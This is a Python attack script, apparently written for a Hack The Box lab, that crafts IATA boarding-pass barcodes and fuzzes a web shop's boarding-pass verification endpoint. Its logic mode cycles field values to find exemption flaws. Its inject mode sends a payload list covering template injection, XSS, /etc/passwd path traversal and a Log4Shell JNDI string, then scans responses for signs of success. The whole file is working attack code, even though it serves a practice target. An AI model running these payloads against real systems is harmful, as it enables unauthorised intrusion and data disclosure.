#!/usr/bin/env python3
"""
BCBP crafter + fuzzer v2 pour DutyBound (HTB).
Construit des passes VALIDES a partir de sous-champs nommes et recalcule
les longueurs hex (item6/item10). Permet :
  - logic2 : varier paxstatus (0-9), cabine, et carrier+issuer COUPLES
  - inject2: injecter dans le champ texte-libre 'airline_use' (pass valide)
  - print  : juste afficher des passes crafts (a coller dans Burp)

Usage:
  python3 bcbp_fuzz2.py --target https://airsnacks.htb --cookie 'session=...' --mode logic2
  python3 bcbp_fuzz2.py --target https://airsnacks.htb --cookie 'session=...' --mode inject2
  python3 bcbp_fuzz2.py --mode print --carrier AF --issuer AF --pax 3 --cabin F --free 'HELLO'
"""
import argparse, json, sys
try:
    import requests; requests.packages.urllib3.disable_warnings()
except ImportError:
    requests=None

def build(passenger="DOE/JOHN", pnr="ABC123", frm="CDG", to="HTB",
          carrier="AF", flight="0123", date="365", cabin="Y", seat="012A",
          seq="0001", pax="1",
          # conditionnel (unique)
          paxdesc="1", src_checkin="W", src_issue="W", date_issue="6319",
          doctype="B", issuer="AF", airline_use="03057"):
    mand = ("M"+"1"+passenger.ljust(20)[:20]+"E"+pnr.ljust(7)[:7]
            +frm.ljust(3)[:3]+to.ljust(3)[:3]+carrier.ljust(3)[:3]
            +flight.ljust(5)[:5]+date.ljust(3)[:3]+cabin[:1]
            +seat.ljust(4)[:4]+seq.ljust(5)[:5]+pax[:1])
    unique = (paxdesc[:1]+src_checkin[:1]+src_issue[:1]+date_issue.ljust(4)[:4]
              +doctype[:1]+issuer.ljust(3)[:3])
    item10 = f"{len(unique):02X}"
    cond = ">"+"6"+item10+unique+airline_use
    item6 = f"{len(cond):02X}"
    return mand+item6+cond

def send(target, cookie, raw):
    h={"Content-Type":"application/json"}
    if cookie: h["Cookie"]=cookie
    r=requests.post(target.rstrip("/")+"/checkout/boarding-pass/verify",
                    headers=h,data=json.dumps({"raw":raw}),verify=False,timeout=15)
    return r.status_code, r.text[:500]

def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--target"); ap.add_argument("--cookie",default="")
    ap.add_argument("--mode",choices=["logic2","inject2","print"],default="logic2")
    # pour --mode print
    for k in ("carrier","issuer","pax","cabin","free","to","frm"):
        ap.add_argument("--"+k)
    a=ap.parse_args()

    if a.mode=="print":
        raw=build(carrier=a.carrier or "AF", issuer=a.issuer or "AF",
                  pax=a.pax or "1", cabin=a.cabin or "Y",
                  to=a.to or "HTB", frm=a.frm or "CDG",
                  airline_use=a.free or "03057")
        print(raw); return

    if requests is None: sys.exit("pip install requests")
    base_raw=build()
    bsc,bbody=send(a.target,a.cookie,base_raw)
    print(f"[baseline] {bsc}  {bbody}\n{'='*70}")
    def rep(label,raw):
        sc,body=send(a.target,a.cookie,raw)
        extra=""
        for mk in ("exempt\": true","exempt\":true","AIRSIDE","INFLIGHT","ARRIVAL",
                   "root:","syntax","traceback","Internal","2401","\"49\"",">49<"):
            if mk.lower() in body.lower(): extra+=f" [{mk}]"
        d=" [DIFF]" if body!=bbody else ""
        print(f"[{label:34}] {sc}{d}{extra}\n    {body[:240]}")

    if a.mode=="logic2":
        print("### passenger status 0-9 ###")
        for p in "0123456789": rep(f"pax={p}", build(pax=p))
        print("### cabine ###")
        for c in "FCJWYR": rep(f"cabin={c}", build(cabin=c))
        print("### carrier+issuer couples (interline valide) ###")
        for cc in ["AF","BA","LH","EK","AA","QF","XX","ZZ"]:
            rep(f"carrier=issuer={cc}", build(carrier=cc, issuer=cc))
        print("### doctype & source d'emission ###")
        for dt in "BIKPT": rep(f"doctype={dt}", build(doctype=dt))
        for si in "WAOTFR": rep(f"src_issue={si}", build(src_issue=si))
    else:  # inject2 : texte libre VALIDE
        PAYLOADS=["{{7*7}}","${7*7}","#{7*7}","<%=7*7%>","{{config}}",
                  "<x>","'\"><b>","../../../../etc/passwd","${jndi:ldap://x}",
                  "A"*40,"49SENTINEL49"]
        for p in PAYLOADS:
            rep(f"free={p[:18]}", build(airline_use=p))

if __name__=="__main__":
    main()
